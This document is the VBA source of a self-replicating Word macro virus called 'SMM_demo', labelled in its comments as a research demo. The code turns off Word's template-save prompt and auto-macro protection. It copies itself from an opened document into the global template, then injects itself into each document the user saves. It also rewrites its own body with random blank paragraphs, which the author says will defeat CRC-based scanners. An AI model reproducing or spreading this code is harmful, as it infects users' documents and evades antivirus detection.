   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim ActionType
   Dim Generation
   Dim F$
   Dim A$
   Dim i
   Dim dlg As Object
   ActionType = 1
   Generation = 1
   '**********************************************************
   'WARNING: This is trivial example of Self Modifying Macro !
   'Only for evaluation purposes !
   'It is strongly prohibited to spread this macro !

   'The name for this shit must be "SMM_demo"


   'Do not use other name please !
   '----------------------------------------------------------
   'Name for this shit: "SMM_demo" research macro


   'Author: Unknown

   'date: Unknown



   'origin: Unknown

   '**********************************************************



   On Error GoTo -1: On Error GoTo BigBug

   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=1
   WordBasic.DisableAutoMacros 0




   F$ = "FileSaveAs"       'name for macro in global template
   A$ = "AutoOpen"         'name for macro in document

   If ActionType = 0 Then

       For i = 1 To WordBasic.CountMacros(0, 0)

           If WordBasic.[MacroName$](i, 0, 0) = F$ Then GoTo BigBug
       Next i
       WordBasic.MacroCopy WordBasic.[FileName$](0) + ":" + A$, "Global:" + F$


       SelfModify F$, "1"
   Else

       For i = 1 To WordBasic.CountMacros(0, 0)

           If WordBasic.[MacroName$](i, 0, 0) = A$ Then GoTo BigBug





       Next i
       Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg


       WordBasic.Dialog.FileSaveAs dlg



       If dlg.Format = 0 Or 1 Or 6 Then
           dlg.Format = 1
           WordBasic.MacroCopy "Global:" + F$, WordBasic.[FileName$](0) + ":" + A$


           WordBasic.FileSaveAs dlg
           SelfModify A$, "0"


           WordBasic.FileSave
       Else

           WordBasic.FileSaveAs dlg

       End If
   End If






   BigBug:
   End Sub




   '*******************************************

   'Main self modifying procedure.
   'This is only very primitive skeleton to
   'show the possibilities of macro self editing
   'Can be improved by many ways


   'Comments for lamers are present



   '*******************************************

   Private Sub SelfModify(m$, i$)
   Dim Generation
       WordBasic.ScreenUpdating 0

       WordBasic.ToolsMacro Name:=m$, Show:=0, Edit:=1
       WordBasic.AtStartOfDocument


       WordBasic.ParaDown          'go to 2nd line in macro
       WordBasic.EndOfLine         'go to end of line 2
       WordBasic.DeleteBackWord    'delete type of action
   '   1 - My name is F$, I'm in global teplate





   '   0 - My name is A$, I'm in document
       WordBasic.Insert i$         'patch number after ActionType (Action type)


       WordBasic.ParaDown          'go to 3rd line in macro
       WordBasic.EndOfLine         'go to end of line 3
       WordBasic.DeleteBackWord    'delete number of generation
       WordBasic.Insert Str(Generation + 1)   'increase generation by 1



   '*************************************************
   'Main trivial point follows:

   'insert a few dummy paragraph in macro
   'this will fuck all CRC based macro scanner :))

   '*************************************************

   lab_1:

       If WordBasic.AtEndOfDocument() = -1 Then GoTo lab_2
       WordBasic.ParaDown 5 + WordBasic.Int(Rnd() * 10)  'do not change





       WordBasic.InsertPara        'insert dummy paragraph
       GoTo lab_1
   lab_2:
   WordBasic.DocClose 1
   End Sub
